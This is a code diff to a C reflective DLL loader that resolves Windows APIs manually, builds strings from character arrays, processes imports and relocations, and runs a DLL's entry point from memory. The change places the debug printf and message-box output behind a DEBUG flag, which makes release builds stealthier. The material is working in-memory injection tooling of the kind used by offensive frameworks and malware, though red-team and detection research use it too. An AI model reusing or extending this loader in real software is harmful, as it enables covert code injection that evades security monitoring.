@@ -34,7 +34,9 @@ typedef struct API_
     UINT64 messageBoxAFn;
     UINT64 VirtualAlloc;
     UINT64 FlushInstructionCache;
+    #ifdef DEBUG
     UINT64 printf;
+    #endif
 } API, *PAPI;
 
 HINSTANCE hAppInstance = NULL;
@@ -166,7 +168,10 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
     CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
     CHAR virtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
     CHAR FlushInstructionCache_c[] = { 'F', 'l', 'u', 's', 'h', 'I', 'n', 's', 't', 'r', 'u', 'c', 't', 'i', 'o', 'n', 'C', 'a', 'c', 'h', 'e', 0 };
+
+    #ifdef DEBUG
     CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
+    #endif
 
     kernel32dll = GetKernel32();
     api->loadLibraryAFn = (UINT64)(GetSymbolAddress((HANDLE)kernel32dll, loadLibrary_c));
@@ -175,9 +180,12 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
     msvcrtdll = (UINT64)(((LOADLIBRARYA)(api->loadLibraryAFn))(msvcrt_c));
 
     api->messageBoxAFn = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
+    #ifdef DEBUG
     api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
+    #endif
     api->FlushInstructionCache = GetSymbolAddress((HANDLE)kernel32dll, FlushInstructionCache_c);
 
+    #ifdef DEBUG
     CHAR a[] = { 'H', 'i', 0 };
     CHAR b[] = { 'R', 'l', 'L', 'o', 'a', 'd', 'e', 'r', 0 };
     ((MESSAGEBOXA)(api->messageBoxAFn))(0, a, b, 0x0000000L);
@@ -185,6 +193,7 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
     char fPointer[] = { '%', 'p', '\n', 0 };
     char fString[] = { '%', 's', '\n', 0 };
     char fDword[] = { '%', 'd', '\n', 0 };
+    #endif
 
     ULONG_PTR uiLibraryAddress = caller();
     while( TRUE )
@@ -254,7 +263,9 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
 
     while (pImportTable->Name)
     {
+        #ifdef DEBUG
         ((PRINTF)api->printf)(fString, uiNewLibraryAddress + pImportTable->Name);
+        #endif
 
         hLoadedLibrary = ((LOADLIBRARYA)api->loadLibraryAFn)((LPCSTR)(uiNewLibraryAddress + (DWORD)pImportTable->Name));
 
@@ -268,8 +279,10 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
             //if (DEREF(pFirstThunk) & IMAGE_ORDINAL_FLAG)
             if (pOriginalFirstThunk && (pOriginalFirstThunk)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
             {
+                #ifdef DEBUG
                 CHAR warn[] = {'O', 'r', 'd', 'i', 'n', 'a', 'l', 'F', 'l', 'a', 'g', 'S', 'e', 't', 0};
                 ((MESSAGEBOXA)api->messageBoxAFn)(0, warn, b, 0x0L);
+                #endif
 
                 // get the VA of the modules NT Header
                 uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
@@ -318,11 +331,15 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
             dwNumberOfRelocs = ( pRelocBlocks->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );
             pRelocEntry = (PIMAGE_RELOC)((UINT_PTR)pRelocBlocks + sizeof(IMAGE_BASE_RELOCATION));
 
+            #ifdef DEBUG
             ((PRINTF)api->printf)(fDword, dwNumberOfRelocs);
+            #endif
             while (dwNumberOfRelocs--)
             {
+                #ifdef DEBUG
                 CHAR uh[] = {'T', 'y', 'p', 'e', ':', ' ', '%', 'd', '\n', 0};
                 ((PRINTF)api->printf)(uh, pRelocEntry->type);
+                #endif
                 if (pRelocEntry->type == IMAGE_REL_BASED_DIR64)
                 { *(ULONG_PTR *)(pRelocAppliedBase + pRelocEntry->offset) += uiLibraryAddress; }
                 else if(pRelocEntry->type == IMAGE_REL_BASED_ABSOLUTE )
@@ -330,11 +347,13 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
                     // ABSOLUTE is used for padding
                     continue;
                 }
+                #ifdef DEBUG
                 else
                 {
                     CHAR error[] = {'E', 'r', 'r', 'o', 'r', ':', ' ', 'U', 'n', 's', 'u', 'p', 'p', 'o', 'r', 't', 'e', 'd', 'R', 'e', 'l', 'o', 'c', 'T', 'y', 'p', 'e', 0};
                     ((MESSAGEBOXA)api->messageBoxAFn)(0, error, b, 0x0L);
                 }
+                #endif
                 pRelocEntry += 1;
             }
             pRelocBlocks = (PIMAGE_BASE_RELOCATION)((UINT_PTR)pRelocBlocks + pRelocBlocks->SizeOfBlock);
@@ -346,7 +365,9 @@ DLLEXPORT UINT_PTR WINAPI ReflectiveLoader()
     ((FLUSHINSTRUCTIONCACHE)api->FlushInstructionCache)((HANDLE)-1, NULL, 0);
     
     ((DLLMAIN)pEntryPoint)((HINSTANCE)uiNewLibraryAddress, DLL_PROCESS_ATTACH, NULL);
+    #ifdef DEBUG
     ((PRINTF)api->printf)(fPointer, pEntryPoint);
+    #endif
 
     return pEntryPoint;
 }
